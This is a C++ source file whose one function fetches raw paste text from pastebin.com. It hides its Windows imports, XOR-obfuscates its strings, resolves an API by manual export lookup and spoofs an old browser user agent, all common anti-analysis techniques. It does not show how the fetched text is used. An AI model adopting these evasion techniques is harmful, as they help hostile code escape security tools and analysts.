#include "PasteBin.h"
#include "BaseIncludes.h"


#include <winhttp.h>
#include <PETools.h>

bool get_paste_bin_text(std::string bincode, std::string& res)
{
    WINDOWS_IMPORT_HIDE(WinHttpOpen, "winhttp.dll");
    WINDOWS_IMPORT_HIDE(WinHttpConnect, "winhttp.dll");
    WINDOWS_IMPORT_HIDE(WinHttpOpenRequest, "winhttp.dll");
    WINDOWS_IMPORT_HIDE(WinHttpSendRequest, "winhttp.dll");
    WINDOWS_IMPORT_HIDE(WinHttpReceiveResponse, "winhttp.dll");
    WINDOWS_IMPORT_HIDE(WinHttpQueryHeaders, "winhttp.dll");
    WINDOWS_IMPORT_HIDE(WinHttpReadData, "winhttp.dll");
    WINDOWS_IMPORT_HIDE(GetLastError, "Kernel32.dll");

    HINTERNET Open = _WinHttpOpen(L"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        NULL
    );

    if (!Open)
        return false;

    decltype(&WinHttpConnect) winConnect = (decltype(&WinHttpConnect))PETools::GetExportAddress(PETools::GetModuleA(XorStr("winhttp.dll")), XorStr("WinHttpConnect"));
    HINTERNET conn = winConnect(Open, XorStrW(L"www.pastebin.com"), INTERNET_DEFAULT_PORT, NULL);


    if (!conn)
    {
        DWORD dwlasterr = _GetLastError();
        return false;
    }

    char requestbuffer[50];
    memset(requestbuffer, 0, sizeof(requestbuffer));
    snprintf(requestbuffer, sizeof(requestbuffer), XorStr("raw/%s"), bincode.c_str());

    std::string req(requestbuffer);
    std::wstring conv(req.begin(), req.end());

    HINTERNET hReq = _WinHttpOpenRequest(conn,
        NULL, conv.c_str(), NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, NULL
    );

    DWORD dwContext = 0;
    if (!_WinHttpSendRequest(hReq, NULL, NULL, NULL, NULL, NULL, dwContext))
        return false;

    char buffer[MAX_PATH * 10];
    memset(buffer, 0, sizeof(buffer));

    if (!_WinHttpReceiveResponse(hReq, NULL))
        return false;

    DWORD status{}, len = sizeof(status);

    if (!_WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL,
        &status, &len, NULL))
    {
        return false;
    }

    if (status != 200)
        return false;

    DWORD dwBytesRead = 0;
    if (!_WinHttpReadData(hReq, buffer, sizeof(buffer), &dwBytesRead))
        return false;

    res = std::string(buffer, dwBytesRead);
    return true;
}